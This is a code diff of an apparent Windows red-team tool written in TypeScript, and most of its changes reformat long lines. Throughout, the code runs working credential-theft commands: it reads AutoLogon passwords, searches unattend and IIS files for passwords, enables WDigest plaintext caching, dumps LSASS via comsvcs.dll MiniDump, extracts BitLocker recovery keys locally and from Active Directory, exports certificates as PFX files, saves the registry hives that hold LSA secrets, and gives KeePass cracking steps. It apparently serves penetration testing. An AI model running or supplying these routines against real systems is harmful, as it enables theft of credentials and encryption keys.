+          title: "WinSCP stored credentials",
+          details: "Encrypted passwords in registry",
+          remediation: "Use key-based auth.",
+        })
       }
     }
     if (action === "rdp" || action === "full") {
@@ -2177,8 +2402,20 @@ export async function regSecrets(args: string[], timeout: number): Promise<HookR
     if (action === "services" || action === "full") {
       output.push("\n=== Service Account Passwords (reg query) ===")
       if (activeExec === "cmd") {
-        const svc = await cmd('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services" /s /v ObjectName 2>nul | findstr /i "ObjectName"', timeout)
-        const nonSystem = svc.stdout.split("\n").filter((l) => l.includes("REG_SZ") && !l.includes("LocalSystem") && !l.includes("NT AUTHORITY") && !l.includes("NetworkService") && !l.includes("LocalService"))
+        const svc = await cmd(
+          'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services" /s /v ObjectName 2>nul | findstr /i "ObjectName"',
+          timeout,
+        )
+        const nonSystem = svc.stdout
+          .split("\n")
+          .filter(
+            (l) =>
+              l.includes("REG_SZ") &&
+              !l.includes("LocalSystem") &&
+              !l.includes("NT AUTHORITY") &&
+              !l.includes("NetworkService") &&
+              !l.includes("LocalService"),
+          )
         if (nonSystem.length > 0) {
           output.push(`[!] Services with custom accounts (${nonSystem.length}):`)
           for (const s of nonSystem.slice(0, 15)) output.push(`    ${s.trim()}`)
@@ -2187,11 +2424,23 @@ export async function regSecrets(args: string[], timeout: number): Promise<HookR
     }
     if (action === "snmp" || action === "full") {
       output.push("\n=== SNMP Community Strings (reg query) ===")
-      const snmp = await cmd('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities" 2>nul', timeout)
+      const snmp = await cmd(
+        'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities" 2>nul',
+        timeout,
+      )
       if (snmp.stdout.trim() && !snmp.stdout.includes("ERROR")) {
         output.push("[!] SNMP community strings found:")
         output.push(snmp.stdout.trim())
-        findings.push({ checkId: "WIN-REG-SNMP", provider: "windows", severity: "high", status: "VULNERABLE", resource: "registry://SNMP", title: "SNMP community strings", details: snmp.stdout.trim(), remediation: "Disable SNMP or use SNMPv3." })
+        findings.push({
+          checkId: "WIN-REG-SNMP",
+          provider: "windows",
+          severity: "high",
+          status: "VULNERABLE",
+          resource: "registry://SNMP",
+          title: "SNMP community strings",
+          details: snmp.stdout.trim(),
+          remediation: "Disable SNMP or use SNMPv3.",
+        })
       }
     }
     return { output: output.join("\n"), findings }
@@ -2436,9 +2685,18 @@ export async function storedCredsAbuse(args: string[], timeout: number): Promise
     found += targets
     output.push(targets > 0 ? `[+] Found ${targets} stored credential(s)` : "[-] No stored credentials")
     output.push("\n=== AutoLogon Credentials ===")
-    const autoUser = await cmd('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultUserName 2>nul', timeout)
-    const autoPass = await cmd('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword 2>nul', timeout)
-    const autoDomain = await cmd('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultDomainName 2>nul', timeout)
+    const autoUser = await cmd(
+      'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultUserName 2>nul',
+      timeout,
+    )
+    const autoPass = await cmd(
+      'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword 2>nul',
+      timeout,
+    )
+    const autoDomain = await cmd(
+      'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultDomainName 2>nul',
+      timeout,
+    )
     const userVal = autoUser.stdout.match(/DefaultUserName\s+REG_SZ\s+(.+)/)?.[1]?.trim()
     const passVal = autoPass.stdout.match(/DefaultPassword\s+REG_SZ\s+(.+)/)?.[1]?.trim()
     const domainVal = autoDomain.stdout.match(/DefaultDomainName\s+REG_SZ\s+(.+)/)?.[1]?.trim()
@@ -2452,13 +2710,24 @@ export async function storedCredsAbuse(args: string[], timeout: number): Promise
       output.push("[-] No AutoLogon configured")
     }
     output.push("\n=== Unattend/Sysprep Files ===")
-    const unattendPaths = ["%SystemRoot%\\Panther\\Unattend.xml", "%SystemRoot%\\Panther\\unattend.xml", "%SystemRoot%\\System32\\Sysprep\\unattend.xml", "%SystemRoot%\\sysprep\\sysprep.xml", "%SystemDrive%\\unattend.xml"]
+    const unattendPaths = [
+      "%SystemRoot%\\Panther\\Unattend.xml",
+      "%SystemRoot%\\Panther\\unattend.xml",
+      "%SystemRoot%\\System32\\Sysprep\\unattend.xml",
+      "%SystemRoot%\\sysprep\\sysprep.xml",
+      "%SystemDrive%\\unattend.xml",
+    ]
     for (const upath of unattendPaths) {
       const check = await cmd(`dir "${upath}" 2>nul`, timeout)
       if (check.exitCode === 0 && check.stdout.includes(".xml")) {
         output.push(`[+] Found: ${upath}`)
         const search = await cmd(`findstr /i "password Password AdminPassword" "${upath}" 2>nul`, timeout)
-        if (search.stdout.trim()) { output.push(`    [!] Password references found:\n    ${search.stdout.trim().split("\n").slice(0, 5).join("\n    ")}`); found++ }
+        if (search.stdout.trim()) {
+          output.push(
+            `    [!] Password references found:\n    ${search.stdout.trim().split("\n").slice(0, 5).join("\n    ")}`,
+          )
+          found++
+        }
       }
     }
     output.push("\n=== PowerShell History ===")
@@ -2473,18 +2742,40 @@ export async function storedCredsAbuse(args: string[], timeout: number): Promise
       output.push("[-] No sensitive keywords in PS history")
     }
     output.push("\n=== Scheduled Tasks with Stored Credentials ===")
-    const tasks = await cmd('schtasks /query /fo csv /v 2>nul | findstr /v /i "SYSTEM,LOCAL.SERVICE,NETWORK.SERVICE,N/A,Disabled"', timeout)
+    const tasks = await cmd(
+      'schtasks /query /fo csv /v 2>nul | findstr /v /i "SYSTEM,LOCAL.SERVICE,NETWORK.SERVICE,N/A,Disabled"',
+      timeout,
+    )
     if (tasks.stdout.trim()) output.push(tasks.stdout.trim().split("\n").slice(0, 10).join("\n"))
     else output.push("[-] No tasks with stored user credentials")
     output.push("\n=== IIS AppPool / web.config ===")
     const iisConfig = "%SystemRoot%\\System32\\inetsrv\\config\\applicationHost.config"
     const iis = await cmd(`findstr /i "password" "${iisConfig}" 2>nul`, timeout)
-    if (iis.stdout.trim()) { output.push(`[+] Passwords in IIS config:\n    ${iis.stdout.trim().split("\n").slice(0, 5).join("\n    ")}`); found++ }
+    if (iis.stdout.trim()) {
+      output.push(`[+] Passwords in IIS config:\n    ${iis.stdout.trim().split("\n").slice(0, 5).join("\n    ")}`)
+      found++
+    }
     output.push("\n=== McAfee/Trellix SiteList.xml ===")
-    const mcafee = await cmd('dir /s /b "C:\\Program Files*\\McAfee\\*SiteList.xml" 2>nul && dir /s /b "%ALLUSERSPROFILE%\\McAfee\\*SiteList.xml" 2>nul', timeout)
-    if (mcafee.stdout.trim()) { output.push(`[+] Found: ${mcafee.stdout.trim()}`); found++ }
+    const mcafee = await cmd(
+      'dir /s /b "C:\\Program Files*\\McAfee\\*SiteList.xml" 2>nul && dir /s /b "%ALLUSERSPROFILE%\\McAfee\\*SiteList.xml" 2>nul',
+      timeout,
+    )
+    if (mcafee.stdout.trim()) {
+      output.push(`[+] Found: ${mcafee.stdout.trim()}`)
+      found++
+    }
     output.push(`\n=== Summary ===\n[+] Total credential findings: ${found}`)
-    if (found > 0) findings.push({ checkId: "WIN-PRIVESC-CRED-001", provider: "windows", severity: "high", status: "ENUMERATED", resource: "credentials://stored", title: `${found} stored credential(s) found via cmd.exe`, details: "cmdkey, AutoLogon, Unattend, PS history, IIS, McAfee enumerated", remediation: "Remove stored credentials. Disable AutoLogon. Delete unattend files. Clear PS history." })
+    if (found > 0)
+      findings.push({
+        checkId: "WIN-PRIVESC-CRED-001",
+        provider: "windows",
+        severity: "high",
+        status: "ENUMERATED",
+        resource: "credentials://stored",
+        title: `${found} stored credential(s) found via cmd.exe`,
+        details: "cmdkey, AutoLogon, Unattend, PS history, IIS, McAfee enumerated",
+        remediation: "Remove stored credentials. Disable AutoLogon. Delete unattend files. Clear PS history.",
+      })
     return { output: output.join("\n"), findings }
   }
 
@@ -2706,7 +2997,16 @@ export async function wdigestEnable(args: string[], timeout: number): Promise<Ho
       if (val === "1") {
         output.push("UseLogonCredential: 1")
         output.push("STATUS: ENABLED — plaintext credentials WILL be cached in LSASS on next logon")
-        findings.push({ checkId: "WDIGEST-001", provider: "winhook", severity: "high", status: "FAIL", resource: regPath, title: "WDigest plaintext credential caching is enabled", details: "UseLogonCredential=1", remediation: "Set UseLogonCredential to 0" })
+        findings.push({
+          checkId: "WDIGEST-001",
+          provider: "winhook",
+          severity: "high",
+          status: "FAIL",
+          resource: regPath,
+          title: "WDigest plaintext credential caching is enabled",
+          details: "UseLogonCredential=1",
+          remediation: "Set UseLogonCredential to 0",
+        })
       } else if (val === "0") {
         output.push("UseLogonCredential: 0\nSTATUS: DISABLED")
       } else {
@@ -2724,12 +3024,25 @@ export async function wdigestEnable(args: string[], timeout: number): Promise<Ho
         output.push("  1. Wait for user to log in (or: rundll32 user32.dll,LockWorkStation)")
         output.push("  2. Run: winhook lsass_dump")
         output.push("  3. Cleanup: winhook wdigest_enable --action disable")
-        findings.push({ checkId: "WDIGEST-002", provider: "winhook", severity: "critical", status: "PASS", resource: "WDigest", title: "WDigest enabled via cmd.exe reg add", details: "UseLogonCredential=1 set", remediation: "Run winhook wdigest_enable --action disable" })
+        findings.push({
+          checkId: "WDIGEST-002",
+          provider: "winhook",
+          severity: "critical",
+          status: "PASS",
+          resource: "WDigest",
+          title: "WDigest enabled via cmd.exe reg add",
+          details: "UseLogonCredential=1 set",
+          remediation: "Run winhook wdigest_enable --action disable",
+        })
       }
     }
     if (action === "disable") {
       const r = await cmd(`reg add "${regPath}" /v UseLogonCredential /t REG_DWORD /d 0 /f`, timeout)
-      output.push(r.exitCode === 0 ? "SUCCESS: WDigest UseLogonCredential set to 0 — plaintext caching disabled" : `FAILED: ${r.stderr}`)
+      output.push(
+        r.exitCode === 0
+          ? "SUCCESS: WDigest UseLogonCredential set to 0 — plaintext caching disabled"
+          : `FAILED: ${r.stderr}`,
+      )
     }
     if (action === "lock") {
       output.push("[*] Locking workstation via cmd.exe...")
@@ -2902,10 +3215,22 @@ export async function nanodumpAdvanced(args: string[], timeout: number): Promise
       const lsassPid = tasklist.stdout.split(",")[1]?.replace(/"/g, "").trim()
       if (lsassPid) {
         output.push(`[+] LSASS PID: ${lsassPid}\n`)
-        const r = await cmd(`rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump ${lsassPid} "${outfile}" full`, timeout)
+        const r = await cmd(
+          `rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump ${lsassPid} "${outfile}" full`,
+          timeout,
+        )
         output.push(r.exitCode === 0 ? `[+] LSASS dumped to: ${outfile}` : `[!] comsvcs.dll dump failed: ${r.stderr}`)
         if (r.exitCode === 0) {
-          findings.push({ checkId: "WIN-NANO-001", provider: "windows", severity: "critical", status: "DUMPED", resource: "process://lsass", title: "LSASS dumped via cmd.exe comsvcs.dll", details: `File: ${outfile}, PID: ${lsassPid}`, remediation: "Enable Credential Guard + LSASS PPL" })
+          findings.push({
+            checkId: "WIN-NANO-001",
+            provider: "windows",
+            severity: "critical",
+            status: "DUMPED",
+            resource: "process://lsass",
+            title: "LSASS dumped via cmd.exe comsvcs.dll",
+            details: `File: ${outfile}, PID: ${lsassPid}`,
+            remediation: "Enable Credential Guard + LSASS PPL",
+          })
         }
       }
     }
@@ -3326,7 +3651,10 @@ export async function winHelloDump(args: string[], timeout: number): Promise<Hoo
       const ngcSet = dsreg.stdout.match(/NgcSet\s*:\s*(\w+)/)?.[1] || "Unknown"
       output.push(`NGC (Next Generation Credential) Set: ${ngcSet}`)
       output.push("\n--- NGC Key Containers ---")
-      const ngcDir = await cmd('dir /b /ad "%SystemRoot%\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Ngc" 2>nul', timeout)
+      const ngcDir = await cmd(
+        'dir /b /ad "%SystemRoot%\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Ngc" 2>nul',
+        timeout,
+      )
       const containers = ngcDir.stdout.trim().split("\n").filter(Boolean)
       output.push(`NGC containers found: ${containers.length}`)
       for (const c of containers.slice(0, 10)) output.push(`  Container: ${c.trim()}`)
@@ -3340,11 +3668,27 @@ export async function winHelloDump(args: string[], timeout: number): Promise<Hoo
       const bio = await cmd("sc query WbioSrvc 2>nul", timeout)
       output.push(bio.stdout.includes("RUNNING") ? "WinBio Service: Running" : "WinBio Service: Not running/found")
       output.push("\n--- WHfB Policy ---")
-      const cloud = await cmd('reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\PassportForWork" /v UseCloudTrustForOnPremAuth 2>nul', timeout)
-      const cert = await cmd('reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\PassportForWork" /v UseCertificateForOnPremAuth 2>nul', timeout)
+      const cloud = await cmd(
+        'reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\PassportForWork" /v UseCloudTrustForOnPremAuth 2>nul',
+        timeout,
+      )
+      const cert = await cmd(
+        'reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\PassportForWork" /v UseCertificateForOnPremAuth 2>nul',
+        timeout,
+      )
       output.push(`Cloud Trust: ${cloud.stdout.includes("0x1") ? "Enabled" : "Disabled/Not configured"}`)
       output.push(`Certificate Trust: ${cert.stdout.includes("0x1") ? "Enabled" : "Disabled/Not configured"}`)
-      if (containers.length > 0) findings.push({ checkId: "HELLO-001", provider: "winhook", severity: "high", status: "FAIL", resource: "Windows Hello NGC", title: "Windows Hello NGC key containers found via cmd.exe", details: `${containers.length} NGC containers discovered`, remediation: "Enable Credential Guard to protect NGC keys" })
+      if (containers.length > 0)
+        findings.push({
+          checkId: "HELLO-001",
+          provider: "winhook",
+          severity: "high",
+          status: "FAIL",
+          resource: "Windows Hello NGC",
+          title: "Windows Hello NGC key containers found via cmd.exe",
+          details: `${containers.length} NGC containers discovered`,
+          remediation: "Enable Credential Guard to protect NGC keys",
+        })
     }
     if (action === "pin-policy") {
       output.push("=== Windows Hello PIN Policy ===")
@@ -3354,7 +3698,16 @@ export async function winHelloDump(args: string[], timeout: number): Promise<Hoo
       output.push(`Min Length: ${minVal ? parseInt(minVal, 16) : "4 (default)"}`)
       if (!minVal || parseInt(minVal, 16) < 6) {
         output.push("[!] PIN length requirement is weak — brute force feasible")
-        findings.push({ checkId: "HELLO-002", provider: "winhook", severity: "medium", status: "FAIL", resource: "Windows Hello PIN Policy", title: "Weak PIN policy", details: "PIN length < 6", remediation: "Set minimum PIN length to 6+ via GPO" })
+        findings.push({
+          checkId: "HELLO-002",
+          provider: "winhook",
+          severity: "medium",
+          status: "FAIL",
+          resource: "Windows Hello PIN Policy",
+          title: "Weak PIN policy",
+          details: "PIN length < 6",
+          remediation: "Set minimum PIN length to 6+ via GPO",
+        })
       }
     }
     if (action === "keys") {
@@ -3362,8 +3715,13 @@ export async function winHelloDump(args: string[], timeout: number): Promise<Hoo
       output.push("[!] Key data extraction and DPAPI decryption require PS/.NET")
       output.push("[*] File locations:")
       output.push('    dir /s /b "%SystemRoot%\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Ngc"')
-      output.push('    dir /s /b "%SystemRoot%\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\Keys"')
-      const ngcFiles = await cmd('dir /s /b "%SystemRoot%\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Ngc\\*.dat" 2>nul', timeout)
+      output.push(
+        '    dir /s /b "%SystemRoot%\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\Keys"',
+      )
+      const ngcFiles = await cmd(
+        'dir /s /b "%SystemRoot%\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Ngc\\*.dat" 2>nul',
+        timeout,
+      )
       if (ngcFiles.stdout.trim()) output.push(`\n[+] NGC key files:\n${ngcFiles.stdout}`)
     }
     return { output: output.join("\n"), findings }
@@ -3662,22 +4020,54 @@ export async function bitlockerKeys(args: string[], timeout: number): Promise<Ho
       const recoveryMatch = protectors.stdout.match(/\d{6}-\d{6}-\d{6}-\d{6}-\d{6}-\d{6}-\d{6}-\d{6}/g) || []
       for (const rk of recoveryMatch) {
         output.push(`[+] RECOVERY PASSWORD: ${rk}`)
-        findings.push({ checkId: "BITL-001", provider: "winhook", severity: "critical", status: "FAIL", resource: "BitLocker", title: "BitLocker recovery password extracted via manage-bde", details: rk, remediation: "Rotate BitLocker recovery keys, restrict admin access" })
+        findings.push({
+          checkId: "BITL-001",
+          provider: "winhook",
+          severity: "critical",
+          status: "FAIL",
+          resource: "BitLocker",
+          title: "BitLocker recovery password extracted via manage-bde",
+          details: rk,
+          remediation: "Rotate BitLocker recovery keys, restrict admin access",
+        })
       }
       if (status.stdout.includes("Protection Off") && status.stdout.includes("Fully Encrypted")) {
         output.push("\n[!] BitLocker protection SUSPENDED — cleartext keys in memory!")
-        findings.push({ checkId: "BITL-002", provider: "winhook", severity: "critical", status: "FAIL", resource: "BitLocker Suspended", title: "BitLocker protection suspended", details: "Keys in cleartext memory", remediation: "Resume: manage-bde -protectors -enable C:" })
+        findings.push({
+          checkId: "BITL-002",
+          provider: "winhook",
+          severity: "critical",
+          status: "FAIL",
+          resource: "BitLocker Suspended",
+          title: "BitLocker protection suspended",
+          details: "Keys in cleartext memory",
+          remediation: "Resume: manage-bde -protectors -enable C:",
+        })
       }
       const allVolumes = await cmd("manage-bde -status", timeout)
       output.push(`\n[*] All volumes:\n${allVolumes.stdout}`)
     }
     if (action === "ad") {
       output.push("[!] AD BitLocker key query requires LDAP (PS/dsquery)")
-      output.push("[*] Alternative: dsquery * -filter \"(objectClass=msFVE-RecoveryInformation)\" -attr msFVE-RecoveryPassword distinguishedName")
-      const dsquery = await cmd('dsquery * -filter "(objectClass=msFVE-RecoveryInformation)" -attr msFVE-RecoveryPassword -limit 100 2>nul', timeout)
+      output.push(
+        '[*] Alternative: dsquery * -filter "(objectClass=msFVE-RecoveryInformation)" -attr msFVE-RecoveryPassword distinguishedName',
+      )
+      const dsquery = await cmd(
+        'dsquery * -filter "(objectClass=msFVE-RecoveryInformation)" -attr msFVE-RecoveryPassword -limit 100 2>nul',
+        timeout,
+      )
       if (dsquery.exitCode === 0 && dsquery.stdout.trim()) {
         output.push(`[+] AD BitLocker keys:\n${dsquery.stdout}`)
-        findings.push({ checkId: "BITL-003", provider: "winhook", severity: "critical", status: "FAIL", resource: "AD BitLocker Keys", title: "BitLocker recovery keys from AD via dsquery", details: "msFVE-RecoveryInformation objects readable", remediation: "Restrict read permissions on msFVE-RecoveryInformation" })
+        findings.push({
+          checkId: "BITL-003",
+          provider: "winhook",
+          severity: "critical",
+          status: "FAIL",
+          resource: "AD BitLocker Keys",
+          title: "BitLocker recovery keys from AD via dsquery",
+          details: "msFVE-RecoveryInformation objects readable",
+          remediation: "Restrict read permissions on msFVE-RecoveryInformation",
+        })
       } else {
         output.push("[-] dsquery failed or no keys found")
       }
@@ -3690,7 +4080,10 @@ export async function bitlockerKeys(args: string[], timeout: number): Promise<Ho
       output.push("=== BitLocker Deployment ===")
       const fve = await cmd('reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE" /s 2>nul', timeout)
       output.push(fve.stdout.trim() ? fve.stdout : "[-] No BitLocker GPO settings")
-      const tpm = await cmd("wmic /namespace:\\\\root\\cimv2\\security\\microsofttpm path Win32_Tpm get IsEnabled_InitialValue,IsActivated_InitialValue,SpecVersion /format:list 2>nul", timeout)
+      const tpm = await cmd(
+        "wmic /namespace:\\\\root\\cimv2\\security\\microsofttpm path Win32_Tpm get IsEnabled_InitialValue,IsActivated_InitialValue,SpecVersion /format:list 2>nul",
+        timeout,
+      )
       output.push(tpm.stdout.trim() ? `\n[+] TPM:\n${tpm.stdout}` : "\n[-] TPM not found via WMI")
     }
     return { output: output.join("\n"), findings }
@@ -3963,14 +4356,30 @@ export async function certSteal(args: string[], timeout: number): Promise<HookRe
         for (const sm of serialMatches.slice(0, 10)) {
           const serial = sm.replace("Serial Number: ", "").trim()
           const pfxPath = `${outputPath}\\cs-cert-${serial.slice(0, 8)}.pfx`
-          const exp = await cmd(`certutil ${storeFlag} -exportPFX -p "${pfxPassword}" My ${serial} "${pfxPath}"`, timeout)
-          output.push(exp.exitCode === 0 ? `[+] Exported: ${pfxPath}` : `[-] Export failed for ${serial}: ${exp.stderr.split("\n")[0]}`)
+          const exp = await cmd(
+            `certutil ${storeFlag} -exportPFX -p "${pfxPassword}" My ${serial} "${pfxPath}"`,
+            timeout,
+          )
+          output.push(
+            exp.exitCode === 0
+              ? `[+] Exported: ${pfxPath}`
+              : `[-] Export failed for ${serial}: ${exp.stderr.split("\n")[0]}`,
+          )
         }
       }
       output.push(`[*] Export password: ${pfxPassword}`)
     }
-    const certCount = output.filter(l => l.includes("cert(s)")).length
-    findings.push({ checkId: "WIN-CERT-001", provider: "windows", severity: output.some(l => l.includes("!!!")) ? "critical" : "medium", status: action === "export" ? "EXECUTED" : "ENUMERATED", resource: "certstore://local", title: "Certificate store enumeration via certutil", details: `Enumerated ${certCount} stores`, remediation: "Mark private keys as non-exportable. Use HSMs for code signing certs." })
+    const certCount = output.filter((l) => l.includes("cert(s)")).length
+    findings.push({
+      checkId: "WIN-CERT-001",
+      provider: "windows",
+      severity: output.some((l) => l.includes("!!!")) ? "critical" : "medium",
+      status: action === "export" ? "EXECUTED" : "ENUMERATED",
+      resource: "certstore://local",
+      title: "Certificate store enumeration via certutil",
+      details: `Enumerated ${certCount} stores`,
+      remediation: "Mark private keys as non-exportable. Use HSMs for code signing certs.",
+    })
     return { output: output.join("\n"), findings }
   }
 
@@ -4100,19 +4509,30 @@ export async function keepassDump(args: string[], timeout: number): Promise<Hook
   if (activeExec === "cmd" || activeExec === "bat") {
     output.push("=== KeePass Credential Extraction (cmd.exe) ===\n")
     output.push("[!] Memory extraction (CVE-2023-32784) and trigger injection require PS/.NET\n")
-    const proc = await cmd('tasklist /fi "imagename eq KeePass.exe" /fo csv /nh 2>nul && tasklist /fi "imagename eq KeePassXC.exe" /fo csv /nh 2>nul', timeout)
+    const proc = await cmd(
+      'tasklist /fi "imagename eq KeePass.exe" /fo csv /nh 2>nul && tasklist /fi "imagename eq KeePassXC.exe" /fo csv /nh 2>nul',
+      timeout,
+    )
     if (proc.stdout.includes("KeePass")) {
       output.push("[!] KeePass is RUNNING:")
       output.push(proc.stdout.trim())
     }
     output.push("\n=== KeePass Installation ===")
-    const searchPaths = ['"%ProgramFiles%\\KeePass*"', '"%ProgramFiles(x86)%\\KeePass*"', '"%LOCALAPPDATA%\\KeePass*"', '"%LOCALAPPDATA%\\KeePassXC*"']
+    const searchPaths = [
+      '"%ProgramFiles%\\KeePass*"',
+      '"%ProgramFiles(x86)%\\KeePass*"',
+      '"%LOCALAPPDATA%\\KeePass*"',
+      '"%LOCALAPPDATA%\\KeePassXC*"',
+    ]
     for (const sp of searchPaths) {
       const r = await cmd(`dir /b /ad ${sp} 2>nul`, timeout)
       if (r.stdout.trim()) output.push(`[+] Found: ${r.stdout.trim()}`)
     }
     output.push("\n=== KeePass Database Files (.kdbx) ===")
-    const kdbx = await cmd('dir /s /b "%USERPROFILE%\\*.kdbx" 2>nul && dir /s /b "%APPDATA%\\*.kdbx" 2>nul && dir /s /b "%USERPROFILE%\\Documents\\*.kdbx" 2>nul && dir /s /b "%USERPROFILE%\\Desktop\\*.kdbx" 2>nul', timeout)
+    const kdbx = await cmd(
+      'dir /s /b "%USERPROFILE%\\*.kdbx" 2>nul && dir /s /b "%APPDATA%\\*.kdbx" 2>nul && dir /s /b "%USERPROFILE%\\Documents\\*.kdbx" 2>nul && dir /s /b "%USERPROFILE%\\Desktop\\*.kdbx" 2>nul',
+      timeout,
+    )
     if (kdbx.stdout.trim()) {
       const files = kdbx.stdout.trim().split("\n").filter(Boolean)
       output.push(`[!] Found ${files.length} database file(s):`)
@@ -4136,7 +4556,16 @@ export async function keepassDump(args: string[], timeout: number): Promise<Hook
     output.push("    Trigger injection: Modify KeePass.config.xml to export DB on open")
     output.push("    Key file theft: Copy .kdbx + key file → offline brute force")
     output.push("    Offline crack: keepass2john.py db.kdbx | hashcat -m 13400")
-    findings.push({ checkId: "WIN-CRED-022", provider: "windows", severity: proc.stdout.includes("KeePass") ? "high" : "medium", status: "ENUMERATED", resource: "keepass://enum", title: "KeePass discovery via cmd.exe", details: "Installation, databases, and config enumerated", remediation: "Enable trigger protection. Use hardware key files." })
+    findings.push({
+      checkId: "WIN-CRED-022",
+      provider: "windows",
+      severity: proc.stdout.includes("KeePass") ? "high" : "medium",
+      status: "ENUMERATED",
+      resource: "keepass://enum",
+      title: "KeePass discovery via cmd.exe",
+      details: "Installation, databases, and config enumerated",
+      remediation: "Enable trigger protection. Use hardware key files.",
+    })
     return { output: output.join("\n"), findings }
   }
 
@@ -4461,25 +4890,57 @@ export async function lsaSecrets(args: string[], timeout: number): Promise<HookR
         output.push(`[+] SYSTEM hive saved: ${outdir}\\SYSTEM`)
         output.push(`[*] Extract with: secretsdump.py -security ${outdir}\\SECURITY -system ${outdir}\\SYSTEM LOCAL`)
       } else {
-        output.push(`[!] Hive save failed — requires Administrator:\n    ${secSave.stderr.trim()}\n    ${sysSave.stderr.trim()}`)
+        output.push(
+          `[!] Hive save failed — requires Administrator:\n    ${secSave.stderr.trim()}\n    ${sysSave.stderr.trim()}`,
+        )
       }
       output.push("\n=== LSA Secret Key Names (reg query) ===")
       const secrets = await cmd('reg query "HKLM\\SECURITY\\Policy\\Secrets" 2>nul', timeout)
       if (secrets.exitCode === 0 && secrets.stdout.trim()) {
-        const keys = secrets.stdout.trim().split("\n").filter(l => l.includes("HKEY_LOCAL_MACHINE")).map(l => l.split("\\").pop()?.trim()).filter(Boolean)
+        const keys = secrets.stdout
+          .trim()
+          .split("\n")
+          .filter((l) => l.includes("HKEY_LOCAL_MACHINE"))
+          .map((l) => l.split("\\").pop()?.trim())
+          .filter(Boolean)
         output.push(`[+] Found ${keys.length} LSA secret entries:`)
         for (const k of keys) {
-          const desc = k === "DPAPI_SYSTEM" ? "DPAPI system master key" : k === "$MACHINE.ACC" ? "Machine account password" : k === "NL$KM" ? "Cached credential encryption key" : k === "DefaultPassword" ? "!!! AutoLogon password !!!" : k?.startsWith("_SC_") ? `Service account: ${k.replace("_SC_", "")}` : k?.startsWith("L$") ? `Cached secret: ${k}` : "Other"
-          const risk = ["DefaultPassword", "$MACHINE.ACC", "DPAPI_SYSTEM", "NL$KM"].includes(k || "") || k?.startsWith("_SC_") ? "HIGH" : "LOW"
+          const desc =
+            k === "DPAPI_SYSTEM"
+              ? "DPAPI system master key"
+              : k === "$MACHINE.ACC"
+                ? "Machine account password"
+                : k === "NL$KM"
+                  ? "Cached credential encryption key"
+                  : k === "DefaultPassword"
+                    ? "!!! AutoLogon password !!!"
+                    : k?.startsWith("_SC_")
+                      ? `Service account: ${k.replace("_SC_", "")}`
+                      : k?.startsWith("L$")
+                        ? `Cached secret: ${k}`
+                        : "Other"
+          const risk =
+            ["DefaultPassword", "$MACHINE.ACC", "DPAPI_SYSTEM", "NL$KM"].includes(k || "") || k?.startsWith("_SC_")
+              ? "HIGH"
+              : "LOW"
           output.push(`    [${risk}] ${k}\n         ${desc}`)
         }
       } else {
         output.push("[-] Cannot enumerate secret keys — insufficient permissions")
       }
       output.push("\n=== AutoLogon Credentials ===")
-      const autoPass = await cmd('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword 2>nul', timeout)
-      const autoUser = await cmd('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultUserName 2>nul', timeout)
-      const autoDomain = await cmd('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultDomainName 2>nul', timeout)
+      const autoPass = await cmd(
+        'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword 2>nul',
+        timeout,
+      )
+      const autoUser = await cmd(
+        'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultUserName 2>nul',
+        timeout,
+      )
+      const autoDomain = await cmd(
+        'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultDomainName 2>nul',
+        timeout,
+      )
       const passVal = autoPass.stdout.match(/DefaultPassword\s+REG_SZ\s+(.+)/)?.[1]?.trim()
       const userVal = autoUser.stdout.match(/DefaultUserName\s+REG_SZ\s+(.+)/)?.[1]?.trim()
       const domainVal = autoDomain.stdout.match(/DefaultDomainName\s+REG_SZ\s+(.+)/)?.[1]?.trim()
@@ -4492,14 +4953,29 @@ export async function lsaSecrets(args: string[], timeout: number): Promise<HookR
         output.push("[-] No AutoLogon configured")
       }
       output.push("\n=== Service Account Secrets ===")
-      const svcSecrets = secrets.stdout?.trim().split("\n").filter(l => l.includes("_SC_")).map(l => l.split("\\").pop()?.replace("_SC_", "").trim()) || []
+      const svcSecrets =
+        secrets.stdout
+          ?.trim()
+          .split("\n")
+          .filter((l) => l.includes("_SC_"))
+          .map((l) => l.split("\\").pop()?.replace("_SC_", "").trim()) || []
       for (const svc of svcSecrets) {
         const svcInfo = await cmd(`sc qc "${svc}" 2>nul`, timeout)
